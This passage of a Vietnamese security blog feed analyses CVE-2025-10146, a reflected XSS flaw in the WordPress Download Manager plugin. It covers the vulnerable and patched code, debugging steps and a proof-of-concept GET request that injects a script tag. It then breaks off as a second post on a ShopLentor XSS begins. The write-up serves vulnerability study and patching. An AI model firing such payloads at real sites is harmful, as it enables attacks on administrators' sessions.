1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Download Manager&lt;/strong&gt;: v3.3.23(vul) v√† v3.3.24(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.&#xA;C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L·∫•y &lt;strong&gt;GET params&lt;/strong&gt; v√† g√°n tr·ª±c ti·∫øp v√†o &lt;strong&gt;href&lt;/strong&gt; c·ªßa th·∫ª &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá =&amp;gt; nguy c∆° &lt;strong&gt;reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $get_params_xu = \WPDM\__\__::sanitize_array($get_params_xu, &amp;#39;safetxt&amp;#39;);&#xA;&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo esc_url($reset_url); ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/patch_diff.png&#34;&#xA;    alt=&#34;Patch Diff: sanitized GET parameters and escaped URL&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff: sanitized GET parameters and escaped URL&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;sanitize&lt;/strong&gt; m·∫£ng &lt;strong&gt;GET params&lt;/strong&gt; b·∫±ng &lt;code&gt;sanitize_array&lt;/code&gt; v√† s·ª≠ d·ª•ng &lt;code&gt;esc_url&lt;/code&gt;  ƒë·ªÉ &lt;strong&gt;escape URL&lt;/strong&gt; =&amp;gt; an to√†n h∆°n.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How It Work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta c·∫ßn t√¨m URL th·ª±c s·ª± ƒë·ªÉ inject GET params ch·ª©a XSS payload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; ch·ª©a c√°c tag &lt;strong&gt;php&lt;/strong&gt;, &lt;strong&gt;HTML&lt;/strong&gt; v√† n·∫±m trong &lt;strong&gt;views&lt;/strong&gt; cho th·∫•y file n√†y ƒë∆∞·ª£c include ·ªü n∆°i n√†o ƒë√≥ trong m√£ ngu·ªìn plugin.&lt;/p&gt;&#xA;&lt;p&gt;Ta t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;history.php&lt;/code&gt; trong th∆∞ m·ª•c plugin&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/search1.png&#34;&#xA;    alt=&#34;Search results for history.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search results for history.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Kh√¥ng c√≥ k·∫øt qu·∫£ n√†o kh·ªõp. Kh·∫£ nƒÉng cao n√≥ ƒë∆∞·ª£c include ƒë·ªông nh∆∞ n√†y &lt;code&gt;{$file_name}.php&lt;/code&gt;. Ta t√¨m v·ªõi regex &lt;code&gt;\{.*\}\.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/regex.png&#34;&#xA;    alt=&#34;Regex search for dynamic includes&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Regex search for dynamic includes&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; ƒë∆∞·ª£c include trong &lt;strong&gt;src/Admin/views/stats.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;URL th·ª±c s·ª± ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c khai b√°o ·ªü ƒë·∫ßu file &lt;strong&gt;stats.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$base_page_uri = &amp;#34;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T∆∞∆°ng t·ª± &lt;strong&gt;history.php&lt;/strong&gt;, &lt;strong&gt;stats.php&lt;/strong&gt; c≈©ng ƒë∆∞·ª£c include ·ªü ƒë√¢u ƒë√≥ trong m√£ ngu·ªìn plugin. Nh∆∞ng kh√¥ng c·∫ßn quan t√¢m v√¨ ta ƒë√£ t√¨m ƒë∆∞·ª£c URL th·ª±c s·ª±.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ ch·∫Øc ch·∫Øn h∆°n, ta ƒë·∫∑t &lt;strong&gt;breakpoint&lt;/strong&gt; t·∫°i v·ªã tr√≠ l·ªó h·ªïng trong file &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;, sau ƒë√≥ b·∫Øt ƒë·∫ßu debug v√† truy c·∫≠p URL:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/debug.png&#34;&#xA;    alt=&#34;Breakpoint debugging to observe GET params&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Breakpoint debugging to observe GET params&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Tr∆∞·ªõc ti√™n, plugin l·∫•y to√†n b·ªô &lt;strong&gt;GET parameters&lt;/strong&gt; v√†o &lt;code&gt;$get_params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$user_ids&lt;/code&gt; kh√¥ng r·ªóng, plugin s·∫Ω t·∫°o &lt;strong&gt;n√∫t ‚ÄúClear filter‚Äù&lt;/strong&gt;. ƒê·ªÉ l√†m n√∫t n√†y ho·∫°t ƒë·ªông, c·∫ßn m·ªôt URL m√† &lt;strong&gt;kh√¥ng c√≤n &lt;code&gt;user_ids&lt;/code&gt;&lt;/strong&gt; n·ªØa, n√™n plugin l√†m nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$get_params_xu = $get_params;        // copy to√†n b·ªô GET parameters&#xA;unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);   // b·ªè user_ids ra kh·ªèi m·∫£ng&#xA;$reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;); // t·∫°o URL m·ªõi&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unset($get_params_xu[&#39;user_ids&#39;])&lt;/code&gt; =&amp;gt; lo·∫°i b·ªè b·ªô l·ªçc &lt;code&gt;user_ids&lt;/code&gt; kh·ªèi URL.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_query_arg($get_params_xu, &#39;edit.php&#39;)&lt;/code&gt; &amp;gt; t·∫°o URL m·ªõi v·ªõi c√°c tham s·ªë c√≤n l·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng, URL n√†y ƒë∆∞·ª£c g·∫Øn v√†o n√∫t ‚ÄúClear filter‚Äù:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;K·∫øt qu·∫£:&lt;/strong&gt; Khi ng∆∞·ªùi d√πng nh·∫•n n√∫t, trang s·∫Ω load l·∫°i &lt;strong&gt;m√† kh√¥ng c√≤n b·ªô l·ªçc user_ids&lt;/strong&gt;, t·ª©c l√† &lt;code&gt;‚Äúclear filter‚Äù&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i GET request ch·ª©a XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;amp;user_ids[0]=1&amp;amp;payload=&amp;#34;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta th√™m &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; ƒë·ªÉ ƒë√≥ng th·∫ª &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; sau ƒë√≥ th√™m 1 script d·ªÉ &lt;code&gt;alert()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/xss.png&#34;&#xA;    alt=&#34;Reflected XSS triggered via GET parameter&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Reflected XSS triggered via GET parameter&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ XSS th√†nh c√¥ng, khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o URL do attacker cung c·∫•p th√¨ &lt;strong&gt;reflected XSS&lt;/strong&gt; x·∫£y ra =&amp;gt; X·∫£y ra ƒë√∫ng k·ªãch b·∫£n &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-10146&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Download Manager &amp;lt;= 3.3.23&lt;/strong&gt; l√† &lt;strong&gt;reflected XSS&lt;/strong&gt;, x·∫£y ra khi d·ªØ li·ªáu t·ª´ &lt;strong&gt;GET request&lt;/strong&gt; ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o &lt;strong&gt;HTML attribute&lt;/strong&gt; m√† kh√¥ng ƒë∆∞·ª£c sanitize ho·∫∑c escape. Ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n n√†y (admin/author) c√≥ th·ªÉ b·ªã t·∫•n c√¥ng n·∫øu truy c·∫≠p URL do attacker t·∫°o.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;3.3.24&lt;/strong&gt; ƒë√£:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sanitize m·∫£ng GET parameters&lt;/strong&gt; (&lt;code&gt;sanitize_array&lt;/code&gt;) ƒë·ªÉ lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Escape URL&lt;/strong&gt; khi in ra HTML (&lt;code&gt;esc_url&lt;/code&gt;) ƒë·ªÉ ngƒÉn XSS.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n &lt;strong&gt;sanitize v√† escape d·ªØ li·ªáu&lt;/strong&gt; t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi render ra HTML.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra &lt;strong&gt;quy·ªÅn truy c·∫≠p&lt;/strong&gt; tr∆∞·ªõc khi x·ª≠ l√Ω ho·∫∑c hi·ªÉn th·ªã d·ªØ li·ªáu nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;li&gt;Ngay c·∫£ c√°c role th·∫•p (contributor) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu plugin kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin th∆∞·ªùng xuy√™n l√† c√°ch ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-3-23-reflected-cross-site-scripting-via-user-ids-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager Plugin &amp;lt;= 3.3.24 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58990 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/</link>
      <pubDate>Sun, 05 Oct 2025 22:45:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-05-cve-2025-58990/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng trong plugin &lt;strong&gt;ShopLentor&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;3.2.0&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn &lt;strong&gt;contributor&lt;/strong&gt; ch√®n m√£ ƒë·ªôc v√†o CSS c·ªßa block. CSS n√†y sau ƒë√≥ ƒë∆∞·ª£c n·∫°p inline v√†o trang v√† c√≥ kh·∫£ nƒÉng d·∫´n t·ªõi Stored XSS khi ƒë∆∞·ª£c preview ho·∫∑c hi·ªÉn th·ªã trong tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58990&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58990&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/woolentor-addons/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ShopLentor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 